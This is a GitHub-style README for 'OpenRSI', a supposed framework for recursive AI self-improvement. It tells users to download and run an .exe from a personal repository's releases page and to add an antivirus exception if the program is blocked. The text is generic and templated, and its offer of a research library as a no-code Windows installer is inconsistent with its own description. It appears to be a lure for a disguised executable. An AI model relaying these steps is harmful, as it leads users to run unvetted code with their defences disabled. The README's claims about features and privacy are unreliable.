# 🤖 OpenRSI - Build smarter systems through recursive improvement

[![](https://img.shields.io/badge/Download-OpenRSI-blue)](https://github.com/tituan1515/OpenRSI/releases)

OpenRSI provides a framework for artificial intelligence to study and improve itself. This software contains the OpenMLE library and the Frontis-MA1 agent. These tools allow you to run experiments that measure how well a machine learns. You use this software to build models that refine their own code and logic over time.

## 📥 Getting Started

You do not need to write code to use OpenRSI. We provide a ready-to-use version for Windows. Follow these steps to set up the software on your computer.

1. Visit the [official releases page](https://github.com/tituan1515/OpenRSI/releases) to access the download options.
2. Look for the latest version at the top of the list.
3. Click the file ending in .exe to start the download.
4. Save the file to your desktop or your downloads folder.
5. Double-click the file to open the installer.
6. Follow the on-screen prompts to complete the setup process.

## 🖥️ System Requirements

Your computer needs specific hardware to run OpenRSI effectively. Check these requirements before you start.

*   **Operating System:** Windows 10 or Windows 11.
*   **Processor:** Intel Core i5 or AMD Ryzen 5 processor.
*   **Memory:** At least 8 gigabytes of RAM.
*   **Storage:** 2 gigabytes of free space on your hard drive.
*   **Graphics:** A dedicated graphics card with at least 4 gigabytes of video memory helps speed up the training process.

## ⚙️ Setting Up Your First Experiment

Once you install the software, you can launch it from your start menu. The main window displays a dashboard for your active projects.

1. Open the application.
2. Select the "New Project" button.
3. Name your project and choose a folder to save your results.
4. Select the Frontis-MA1 agent from the dropdown menu.
5. Choose a measurable goal from the list.
6. Press the "Start" button to begin the recursive improvement cycle.

The software will show a progress bar as the agent works. You can view real-time statistics in the logs window. These logs track how the agent changes its internal logic to solve the target task.

## 📈 Understanding the Results

OpenRSI creates a report after each experiment. You find these files in your project folder. The reports show three main metrics:

*   **Accuracy:** This measures how often the agent hits the target goal.
*   **Complexity:** This shows how much the agent modified its own code.
*   **Stability:** This tracks if the agent remains reliable after its updates.

Use these charts to compare different versions of your agents. You can export the data as a spreadsheet file for deeper analysis.

## 🛠️ Troubleshooting Common Issues

Most users experience smooth operation. If you encounter an error, check these solutions:

*   **Software fails to launch:** Ensure your antivirus software does not block the application. You might need to add an exception for the OpenRSI folder.
*   **Low memory warning:** Close other heavy programs like web browsers or video editors while the agent runs.
*   **Update errors:** Check your internet connection. If the download stalls, restart your computer and try again from the releases page.
*   **Black screen on start:** Update your graphics card drivers to the latest version. This fixes most display issues on Windows.

## 🛡️ Privacy and Data

OpenRSI runs locally on your machine. The software does not send your data to any remote server. Your experiments remain private. We do not track your activity or collect usage logs. All files stay within the folder you choose during setup.

## 📦 Advanced Configuration

Power users can modify the experiment settings through the configuration file. Navigate to the installation folder and open the file named config.json using a text editor like Notepad. 

You can change values such as:
*   **Iteration limit:** This sets how many times the agent performs its improvement cycle.
*   **Learning rate:** This controls how aggressive the agent is when it updates its code.
*   **Environment bounds:** This limits the hardware resources the agent can use.

Save the file and restart the application to apply your changes.
